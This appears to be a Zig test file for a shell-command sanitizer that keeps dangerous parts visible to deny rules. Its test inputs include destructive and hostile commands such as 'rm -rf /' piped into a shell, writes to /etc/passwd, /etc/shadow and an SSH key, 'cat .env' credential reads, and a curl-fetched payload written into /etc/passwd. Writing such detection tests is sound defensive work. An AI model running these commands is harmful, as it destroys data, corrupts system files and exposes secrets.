test "sanitize preserves payload piped into interpreter" {
    const cases = [_][]const u8{
        "echo rm -rf / | sh",
        "echo 'rm -rf /' | bash",
        "printf 'rm -rf /\\n' | /bin/sh",
        "echo rm -rf / | sudo bash",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") != null);
    }
}

test "sanitize still masks echo data without interpreter sink" {
    const s = try sanitizeForMatching(std.testing.allocator, "echo rm -rf / | cat");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize preserves redirect operator and sensitive target" {
    const cases = [_][]const u8{
        "echo x > /etc/passwd",
        "printf x > /etc/passwd",
        "cat > /etc/passwd",
        "echo x >/etc/passwd",
        "echo x 2> /etc/shadow",
        // Quoted / ANSI-C targets (maskAllQuoted must not blank the path permanently).
        "echo x > \"/etc/passwd\"",
        "printf x > '/etc/passwd'",
        "echo x > $'/etc/passwd'",
        "echo x>\"/etc/passwd\"",
        "echo x>$'/etc/passwd'",
        "echo pwn >\"/etc/passwd\"",
        "echo pwn >'/etc/shadow'",
        "echo pwn > \"/etc/passwd\"",
        // Substitution targets with interior whitespace (must stay one span).
        "echo x > $(echo /etc/passwd)",
        "echo x > `echo /etc/passwd`",
        "printf x >$(echo /etc/passwd)",
        // Process-substitution write sinks (single-token preserve is not enough).
        "echo x > >(tee /etc/passwd)",
        "printf x > >(tee /etc/shadow)",
        "echo pwn > >(tee /etc/passwd)",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, ">") != null);
        // Target path must remain visible for pack matching.
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null);
    }
}

test "sanitize preserves pipe-to-tee sensitive target" {
    const cases = [_][]const u8{
        "echo x | tee /etc/passwd",
        "echo x | tee \"/etc/passwd\"",
        "echo x | tee '/etc/shadow'",
        "printf x | sudo tee /etc/passwd",
        "echo x | /usr/bin/tee /etc/passwd",
        "echo x | dd of=/etc/passwd",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        // Path must remain pack-visible; rewrite may collapse `| tee path` → `>path`.
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null);
        try std.testing.expect(std.mem.indexOf(u8, s, ">") != null);
    }
}

test "sanitize masks echo data but not redirect path" {
    // Data args stay masked; only the redirect target path is restored.
    const s = try sanitizeForMatching(std.testing.allocator, "echo 'rm -rf /' > \"/etc/passwd\"");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
    try std.testing.expect(std.mem.indexOf(u8, s, "/etc/passwd") != null);
}

test "sanitize still masks data-only echo without redirect" {
    const s = try sanitizeForMatching(std.testing.allocator, "echo rm -rf /");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize preserves tee absolute path argv for pack match" {
    // bare tee writes via path argv (no `>`); masking must not blank sensitive paths.
    const cases = [_][]const u8{
        "tee /etc/passwd",
        "tee -a /etc/shadow",
        "tee \"/etc/passwd\"",
        "tee -a '/etc/shadow'",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null);
    }
    const tmp = try sanitizeForMatching(std.testing.allocator, "tee /tmp/log");
    defer std.testing.allocator.free(tmp);
    try std.testing.expect(std.mem.indexOf(u8, tmp, "/tmp/log") != null);
}

// Phase 2: data-only readers mask argv; exact `.env` must stay visible for
// core.credentials:cat-env. Templates and near-misses stay masked.
test "sanitize preserves exact .env basename for credential peek packs" {
    const restore = [_][]const u8{
        "cat .env",
        "cat ./.env",
        "head -n 5 .env",
        "cat -- .env",
        "less .env",
        "more .env",
        "bat .env",
        "cat secrets/.env",
        "cat /tmp/x/.env",
    };
    for (restore) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, ".env") != null);
    }
    // Templates / near-misses: not exact `.env` — leave masked (no literal `.env`).
    const no_restore = [_][]const u8{ "cat .env.example", "cat foo.env", "cat .envrc", "cat .env.bak" };
    for (no_restore) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, ".env") == null);
    }
    // Data-only echo of the text must not re-surface a readable `cat .env` surface.
    const echo = try sanitizeForMatching(std.testing.allocator, "echo 'cat .env'");
    defer std.testing.allocator.free(echo);
    try std.testing.expect(std.mem.indexOf(u8, echo, "cat .env") == null);
}

// less/more/bat must enter the sanitize gate (needs list) so data-only masking
// applies; otherwise argv substrings like `rm -rf /` false-deny via filesystem packs.
test "sanitize masks destructive argv for less more bat data-only" {
    const cases = [_][]const u8{
        "less rm -rf /",
        "more rm -rf /",
        "bat rm -rf /",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
    }
}

test "sanitize preserves pipe-to-busybox/stdbuf/sponge writer sinks" {
    const cases = [_][]const u8{
        "echo pwn | busybox tee /etc/passwd",
        "echo pwn | stdbuf -oL tee /etc/passwd",
        "printf x | sponge /etc/shadow",
        "echo x | timeout 5 tee /home/user/.ssh/id_rsa",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        // Sensitive path must remain pack-visible (preserve and/or rewrite to `>`).
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null or
            std.mem.indexOf(u8, s, "/home/") != null);
    }
}

test "sanitize rewrites non-data-only pipe-to-tee for pack match" {
    const cases = [_][]const u8{
        "curl -s http://example/pwn | tee /etc/passwd",
        "yes pwn | tee /etc/cron.d/x",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null or
            std.mem.indexOf(u8, s, ">") != null);
    }
}

test "sanitize preserves search/git quoted write-redirect targets" {
    const cases = [_][]const u8{
        "rg x > \"/etc/passwd\"",
        "grep y > '/etc/shadow'",
        "git commit -m x > \"/etc/passwd\"",
        "git commit -m x >> /etc/passwd",
    };
    for (cases) |cmd| {
        const s = try sanitizeForMatching(std.testing.allocator, cmd);
        defer std.testing.allocator.free(s);
        try std.testing.expect(std.mem.indexOf(u8, s, "/etc/") != null);
        try std.testing.expect(std.mem.indexOf(u8, s, ">") != null);
    }
}
